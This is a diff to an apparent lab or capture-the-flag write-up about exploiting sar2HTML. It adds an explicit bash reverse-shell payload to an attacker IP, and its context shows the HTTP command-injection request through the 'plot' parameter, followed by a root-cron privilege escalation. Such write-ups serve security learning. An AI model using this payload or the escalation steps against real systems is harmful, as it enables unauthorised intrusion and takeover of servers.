@@ -138,6 +138,7 @@ listening on [any] 80 ...
 ```
 
 ### send command to target
+Payload: `bash -c 'bash -i >& /dev/tcp/192.168.49.173/80 0>&1'`
 ```http
 GET /sar2HTML/index.php/index.php?plot=;bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.173/80+0>%261' HTTP/1.1
 Host: 192.168.173.35
@@ -165,7 +166,7 @@ www-data
 ```
 
 ## privilege escalation
-### `crontab` has `cronjob` executed by `root`
+### `crontab` exposes a `cronjob` executed by `root`
 ```bash
 $ cat /etc/crontab
 cat /etc/crontab
@@ -204,7 +205,7 @@ ls -lsah /var/www/html/finally.sh
 ```
 
 > No exploitable file permissions
-{: .prompt-dangers }
+{: .prompt-danger }
 
 Lets have a look at the file `write.sh` which is mentioned in the `finally.sh`.
 
@@ -253,7 +254,7 @@ root
 ```
 
 > We got root!
-{: .prompt-info }s
+{: .prompt-info }
 
 ---
 
